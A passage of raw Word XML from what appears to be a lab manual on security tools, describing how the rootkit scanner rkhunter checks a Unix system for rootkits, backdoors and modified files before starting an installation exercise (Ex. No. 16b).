        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e we</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>kn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">wn </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>KM roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="120" w:right="75"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>kh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Hun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a Un</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>x-based</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>backdoors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s. rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a she</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>t wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch car</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>out va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>checks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ocal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>known</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>wa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>It a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>so</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>perfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>checks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ands have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>od</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>up</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ous</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>checks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">work </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">aces, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ud</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">checks for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng app</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ons.</w:t>
      </w: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before="8" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="120" w:right="8873"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1020" w:bottom="280" w:left="1120" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="3104" w:right="815" w:hanging="3004"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 16b                                                                                                         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="41"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-18"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-17"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">N </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
